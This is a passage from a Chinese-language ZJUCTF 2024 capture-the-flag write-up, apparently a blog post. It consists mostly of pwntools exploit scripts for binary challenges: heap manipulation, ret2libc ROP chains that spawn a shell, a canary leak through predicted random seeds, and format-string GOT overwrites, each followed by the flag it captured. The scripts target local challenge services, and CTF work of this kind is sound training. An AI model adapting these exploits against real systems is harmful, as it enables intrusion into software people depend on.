class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = (u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x28</span>-<span class="number">0x120</span>) ^ (heap_addr // <span class="number">0x1000</span> + <span class="number">1</span>)</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake to modify rbp+8</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x30</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment"># add(6, 0x100, flat(b&#x27;&#x27;))</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_rbp = <span class="number">0x000000000002a873</span>+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001cb42f</span>+libc_addr</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi_rbp, bin_sh_addr, <span class="number">0</span>, system_addr)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x100</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取到flag: <code>ZJUCTF&#123;C4ke_8ot?_8otC4ke!&#125;</code></p>
+<h4 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h4><p>存在栈溢出，通过泄漏libc和程序基址后获取shell。中间返回到main函数时需要考虑栈平衡，不过由于payload长度不够，所以最后将返回地址改为start函数，得解。</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000008A9)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">46799</span>)</span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_addr = <span class="number">0x00000000000007da</span></span><br><span class="line">main_addr = <span class="number">0x00000000000008AB</span></span><br><span class="line">start_addr = <span class="number">0x00000000000006D0</span></span><br><span class="line"><span class="comment"># read_addr = int(input(), 16)</span></span><br><span class="line"><span class="comment"># 可以通过printf泄漏基址</span></span><br><span class="line">payload = flat(<span class="string">&#x27;SJTU&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, p16(start_addr))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x6d0</span></span><br><span class="line">info(<span class="string">f&#x27;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> base_addr &gt;= <span class="number">0x1000000</span></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">pop_rdi = <span class="number">0x963</span>+base_addr</span><br><span class="line">read_addr = <span class="number">0x7da</span>+base_addr</span><br><span class="line">start_addr += base_addr</span><br><span class="line">printf_got += base_addr</span><br><span class="line">printf_plt += base_addr</span><br><span class="line">ret_addr = <span class="number">0x8fb</span>+base_addr</span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, printf_got, ret_addr, printf_plt, start_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&#x27;printf_addr: <span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_addr = printf_addr-(0x7fb0075b7e80- 0x7fb007553000)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;printf&quot;</span>, printf_addr)</span><br><span class="line">libc_addr = printf_addr-<span class="number">0x64e40</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造system()</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line">system_addr = <span class="number">0x4f420</span> + libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x1b3d88</span> + libc_addr</span><br><span class="line"><span class="comment"># system_addr = libc_addr+libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="comment"># bin_sh_addr = libc_addr+libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, bin_sh_addr, ret_addr, system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag: <code>ZJUCTF&#123;@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7&#125;</code></p>
+<h3 id="大-A-口算"><a href="#大-A-口算" class="headerlink" title="大 A 口算"></a>大 A 口算</h3><p>首先通过已知种子为2010年的同一时间，可以预测出所有题目。</p>
+<p>漏洞点</p>
+<p><img src="/images/2024-10-22-2024-ZJUCTF-WriteUp.assets/image-20241022210822484.png" alt="image-20241022210822484"></p>
+<p>通过每次写满s变量，可以每次增加1字节，从而达到泄漏canary，partial write跳转到打印flag的函数即可。</p>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间</span></span><br><span class="line">current_time = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印当前时间及时间戳</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间:&quot;</span>, current_time)</span><br><span class="line">current_timestamp = <span class="built_in">int</span>(time.mktime(current_time.timetuple()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间戳:&quot;</span>, current_timestamp)</span><br><span class="line"><span class="comment"># 修改年份为 2010 年</span></span><br><span class="line">modified_time = current_time.replace(year=<span class="number">2010</span>)</span><br><span class="line"><span class="comment"># 获取修改后年份的时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(modified_time.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38911</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001B36)&#x27;)</span></span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = current_timestamp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 推测出正确的timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># guess = random.randint(0, 2)</span></span><br><span class="line">guess = <span class="number">0</span></span><br><span class="line">info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">seed_correct = <span class="literal">False</span></span><br><span class="line">libc.srand(seed+guess)</span><br><span class="line"><span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">    v1 = libc.rand() % <span class="number">20</span> + <span class="number">1</span>  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">    v2 = libc.rand() % <span class="number">20</span> + <span class="number">1</span></span><br><span class="line">    <span class="comment"># info(f&quot;question:\t &#123;v1&#125; ? &#123;v2&#125; &quot;)</span></span><br><span class="line">    <span class="keyword">return</span> v1, v2</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\nNow guess the answer, I&#x27;ll correct your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">score = <span class="built_in">int</span>(p.recv(<span class="number">3</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">info(score)</span><br><span class="line"><span class="keyword">if</span> score == <span class="number">256</span>:</span><br><span class="line">    seed_correct = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;guess in not correct&quot;</span>)</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3: 增加size值 256-&gt;257</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">info(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4: leak base_addr</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">p.recvline()</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2150</span></span><br><span class="line">info(<span class="string">f&quot;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 5: overflow to jump to $rebase(0x0000000000001F9F)</span></span><br><span class="line">puts_addr = <span class="number">0x1F9F</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">puts_addr = base_addr + puts_addr</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;submit&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>*(<span class="number">264</span>-<span class="built_in">len</span>(<span class="string">&#x27;submit&#x27;</span>)), canary, <span class="number">0</span>, puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, payload)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到flag: <code>ZJUCTF&#123;3veRY_7h1n9_1s_UNdEr_Y0uR_c0n7r0l!!&#125;</code></p>
+<h4 id="simple-echo"><a href="#simple-echo" class="headerlink" title="simple echo"></a>simple echo</h4><p>checksec查看保护机制：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/brownie/ctf/matches/2024 ZJUCTF/pwn/simple-echo-attachment/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>ida查看，发现存在格式化字符串漏洞和栈溢出漏洞</p>
+<ul>
+<li>首先可以通过格式化字符串漏洞获取libc基址</li>
+<li>然后通过格式化字符串漏洞将rop链写入返回地址</li>
+</ul>
+<p><code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./app&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0000000000401351&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">39667</span>)</span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%27$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Dididi, I am a simple echo server!&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Blala:0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改printf got地址</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001d8698</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x000000000002a3e5</span>+libc_addr</span><br><span class="line">low = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line">high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">info(<span class="string">f&#x27;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> low &lt; high:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;low-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;high-low&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;high-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;low-high&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got+<span class="number">2</span>, printf_got)</span><br><span 